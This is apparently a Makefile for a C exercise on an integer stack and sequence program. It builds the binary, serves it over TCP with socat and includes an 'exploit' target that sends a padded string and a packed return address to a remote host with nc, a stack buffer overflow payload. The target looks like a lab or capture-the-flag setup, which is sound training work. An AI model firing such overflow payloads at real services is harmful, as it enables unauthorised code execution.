all:
	gcc -c src/pilaEnterosDinamica.c -o bin/pilaEnterosDinamica.o
	gcc -c src/secuenciaEnteros.c bin/pilaEnterosDinamica.o -o bin/secuenciaEnteros.o
	gcc src/ejecutarSecuenciaEnteros.c bin/pilaEnterosDinamica.o bin/secuenciaEnteros.o -o bin/program
	
serve: all
	socat TCP-listen:54471,reuseaddr,fork EXEC:./bin/program

local:
	nc localhost 54471

exploit: 
	nc 10.6.49.127 54471 < </(echo 1; printf "HOLAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; printf "\xf5\x9b\x04\x08\n"; cat -;)
	